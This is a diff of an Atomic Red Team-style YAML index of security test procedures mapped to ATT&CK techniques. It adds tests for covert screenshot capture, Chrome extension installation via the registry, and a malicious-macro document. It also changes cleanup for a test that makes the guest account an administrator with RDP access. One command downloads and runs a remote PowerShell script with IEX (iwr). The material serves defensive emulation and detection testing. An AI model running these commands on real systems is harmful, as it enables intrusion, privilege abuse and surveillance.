+    - name: Capture Linux Desktop using Import Tool
       auto_generated_guid: 9cd1cccb-91e4-4550-9139-e20a586fcea1
-      description: 'Use import command to collect a full desktop screenshot
+      description: 'Use import command from ImageMagick to collect a full desktop
+        screenshot
 
 '
       supported_platforms:
@@ -51240,6 +53476,16 @@ collection:
           description: Output file path
           type: Path
           default: "/tmp/T1113_desktop.png"
+      dependencies:
+      - description: 'ImageMagick must be installed
+
+'
+        prereq_command: 'if import --version; then exit 0; else exit 1; fi
+
+'
+        get_prereq_command: 'sudo apt-get -y install imagemagick
+
+'
       executor:
         command: 'import -window root #{output_file}
 
@@ -51248,6 +53494,32 @@ collection:
 
 '
         name: bash
+    - name: Windows Screencapture
+      auto_generated_guid: 3c898f62-626c-47d5-aad2-6de873d69153
+      description: 'Use Psr.exe binary to collect screenshots of user display. Test
+        will do left mouse click to simulate user behaviour
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        output_file:
+          description: Output file path
+          type: Path
+          default: c:\temp\T1113_desktop.zip
+        recording_time:
+          description: Time to take screenshots
+          type: String
+          default: 5
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12
+          Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;
+          [W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);
+          cmd /c "timeout #{recording_time} > NULL && psr.exe /stop"
+        cleanup_command: 'rm #{output_file} -ErrorAction Ignore'
   T1213.002:
     technique:
       external_references:
@@ -52558,11 +54830,11 @@ initial-access:
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
-          net user guest /active:no
-          net localgroup administrators guest /delete
-          net localgroup "Remote Desktop Users" guest /delete
-          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f
-          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f
+          net user guest /active:no >nul 2>&1
+          net localgroup administrators guest /delete >nul 2>&1
+          net localgroup "Remote Desktop Users" guest /delete >nul 2>&1
+          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
+          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
         name: command_prompt
         elevation_required: true
   T1078.002:
@@ -52824,7 +55096,51 @@ initial-access:
       - Daniel Oakley
       - Travis Smith, Tripwire
       x_mitre_version: '2.1'
-    atomic_tests: []
+      identifier: T1133
+    atomic_tests:
+    - name: Running Chrome VPN Extensions via the Registry 2 vpn extension
+      auto_generated_guid: 4c8db261-a58b-42a6-a866-0a294deedde4
+      description: 'Running Chrome VPN Extensions via the Registry install 2 vpn extension,
+        please see "T1133\src\list of vpn extension.txt" to view complete list
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        chrome_url:
+          description: chrome installer download URL
+          type: url
+          default: https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BFD62DDBC-14C6-20BD-706F-C7744738E422%7D%26lang%3Den%26browser%3D3%26usagestats%3D0%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26installdataindex%3Dempty/chrome/install/ChromeStandaloneSetup64.exe
+        extension_id:
+          description: chrome extension id
+          type: String
+          default: '"fcfhplploccackoneaefokcmbjfbkenj", "fdcgdnkidjaadafnichfpabhfomcebme"
+
+'
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'chrome must be installed
+
+'
+        prereq_command: if (cmd /c "chrome 2>nul") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest -OutFile $env:temp\ChromeStandaloneSetup64.exe #{chrome_url}
+          Start-Process $env:temp\ChromeStandaloneSetup64.exe /S
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          $extList = #{extension_id}
+          foreach ($extension in $extList) {
+            New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force
+            New-ItemProperty -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -PropertyType "String" -Force}
+          Start-Process -FilePath "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+          Start-Sleep -Seconds 30
+          Stop-Process -Name "chrome"
+        cleanup_command: |-
+          $extList = #{extension_id}
+          foreach ($extension in $extList) {
+          Remove-Item -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -ErrorAction Ignore}
   T1200:
     technique:
       id: attack-pattern--d40239b3-05ff-46d8-9bdd-b46d13463ef9
@@ -53115,31 +55431,30 @@ initial-access:
           description: Maldoc application Word or Excel
           type: String
           default: Word
-        ms_office_version:
-          description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
-          type: String
-          default: '16.0'
       dependency_executor_name: powershell
       dependencies:
-      - description: 'Test Requires MS Office to be installed and have been run previously.
-          Run -GetPrereqs to run msword and build dependent registry keys
+      - description: 'Microsoft #{ms_product} must be installed
 
 '
-        prereq_command: 'If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version})
-          { exit 0 } else { exit 1 }
+        prereq_command: |
+          try {
+            New-Object -COMObject "#{ms_product}.Application" | Out-Null
+            $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
+            Stop-Process -Name $process
+            exit 0
+          } catch { exit 1 }
+        get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
+          manually to meet this requirement"
 
 '
-        get_prereq_command: |
-          $msword = New-Object -ComObject word.application
-          Stop-Process -Name WINWORD
       executor:
         command: |
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
-          Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
-        cleanup_command: |
-          if (Test-Path #{jse_path}) { Remove-Item #{jse_path} }
-          Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+          Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
+        cleanup_command: 'Remove-Item #{jse_path} -ErrorAction Ignore
+
+'
         name: powershell
   T1566.002:
     technique:
